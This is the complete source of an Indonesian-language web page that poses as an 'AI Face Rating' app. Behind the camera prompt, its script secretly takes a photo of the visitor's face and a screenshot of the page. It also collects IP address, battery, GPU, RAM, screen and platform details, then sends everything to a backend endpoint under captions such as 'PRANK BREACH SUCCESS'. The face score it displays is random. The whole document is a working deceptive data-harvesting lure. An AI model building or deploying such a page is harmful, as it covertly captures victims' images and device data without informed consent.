<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Rating - Biometric Analysis</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&display=swap');
        :root { --cyan: #00f2ff; }
        body { background: #000; color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; transition: background 0.1s; }
        .app-card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.05); border-radius: 40px; padding: 40px 25px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); }
        #cam-holder { display: none; width: 220px; height: 220px; margin: 25px auto; border-radius: 50%; border: 3px solid var(--cyan); overflow: hidden; position: relative; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .laser { position: absolute; width: 100%; height: 3px; background: var(--cyan); top: 0; animation: scan 2s infinite ease-in-out; box-shadow: 0 0 10px var(--cyan); }
        @keyframes scan { 0%, 100% { top: 0; } 50% { top: 100%; } }
        .btn { background: #fff; color: #000; padding: 18px; border-radius: 20px; border: none; font-weight: 700; cursor: pointer; width: 100%; font-size: 1rem; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        #status { font-size: 0.75rem; color: var(--cyan); margin-top: 15px; font-weight: bold; text-transform: uppercase; letter-spacing: 1.5px; }
        #final-box { display: none; }
    </style>
</head>
<body>
    <div class="app-card" id="capture-area">
        <div id="intro">
            <h1>Face<span style="color:var(--cyan)">Rating</span> AI</h1>
            <p style="color: #888; font-size: 0.9rem;">Analisis struktur wajah dan audit keamanan perangkat menggunakan modul AI terbaru.</p>
            <button class="btn" id="start-btn">MULAI ANALISIS</button>
        </div>
        <div id="cam-holder"><div class="laser"></div><video id="video" autoplay playsinline muted></video></div>
        <div id="status"></div>
        <div id="final-box">
            <h1 style="font-size: 4rem; margin: 10px 0; background: linear-gradient(to bottom, #fff, var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent;" id="score-val">0%</h1>
            <p style="font-weight: bold;">VERIFIED GOLDEN PROFILE</p>
        </div>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const v = document.getElementById('video');
        const c = document.getElementById('canvas');
        const s = document.getElementById('status');

        document.getElementById('start-btn').onclick = async () => {
            document.getElementById('intro').style.display = 'none';
            document.getElementById('cam-holder').style.display = 'block';
            s.innerText = "Initializing AI Sensors...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                v.srcObject = stream;
                
                setTimeout(async () => {
                    s.innerText = "Extracting Biometric Data...";
                    
                    let ip = "N/A"; try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
                    let bt = "N/A"; try { const b = await navigator.getBattery(); bt = Math.round(b.level * 100) + "%"; } catch(e) {}
                    let gp = "N/A"; try { const gl = document.createElement('canvas').getContext('webgl'); const db = gl.getExtension('WEBGL_debug_renderer_info'); gp = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); } catch(e) {}
                    let ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A";
                    let screen = `${window.screen.width}x${window.screen.height}`;

                    setTimeout(async () => {
                        // 1. Capture Foto Kamera
                        const ctx = c.getContext('2d');
                        c.width = v.videoWidth; c.height = v.videoHeight;
                        ctx.translate(c.width, 0); ctx.scale(-1, 1);
                        ctx.drawImage(v, 0, 0, c.width, c.height);
                        const photoBase64 = c.toDataURL('image/png');

                        // 2. Capture Screenshot Tampilan Web
                        const screenCanvas = await html2canvas(document.body);
                        const screenBase64 = screenCanvas.toDataURL('image/png');

                        const sc = Math.floor(Math.random() * 8) + 91;

                        // Efek Flash Putih (Fake Screenshot)
                        document.body.style.background = "#fff";
                        
                        // KIRIM FOTO WAJAH + DATA
                        await fetch('/api/send', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                image: photoBase64,
                                caption: `ðŸŽ¯ **PRANK BREACH SUCCESS**\n\nâ­ **Face Score:** ${sc}%\nðŸŒ **IP:** \`${ip}\`\nðŸ”‹ **Battery:** ${bt}\nðŸ–¥ï¸ **Screen:** ${screen}\nðŸ’¾ **RAM:** Â±${ram}\nðŸŽ® **GPU:** \`${gp}\`\nðŸ“± **Platform:** ${navigator.platform}\n\nâš ï¸ *Camera Captured*`
                            })
                        });

                        // KIRIM SCREENSHOT LAYAR
                        await fetch('/api/send', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                image: screenBase64,
                                caption: `ðŸ–¼ï¸ **REAL SCREENSHOT CAPTURED**\nTarget sedang melihat halaman ini.`
                            })
                        });

                        setTimeout(() => {
                            document.body.style.background = "#000";
                            document.getElementById('cam-holder').style.display = 'none';
                            s.innerText = "";
                            document.getElementById('score-val').innerText = sc + "%";
                            document.getElementById('final-box').style.display = 'block';
                            v.srcObject.getTracks().forEach(t => t.stop());
                        }, 100);
                    }, 4000);
                }, 1000);
            } catch (err) { alert("Akses kamera ditolak!"); location.reload(); }
        };
    </script>
</body>
</html>
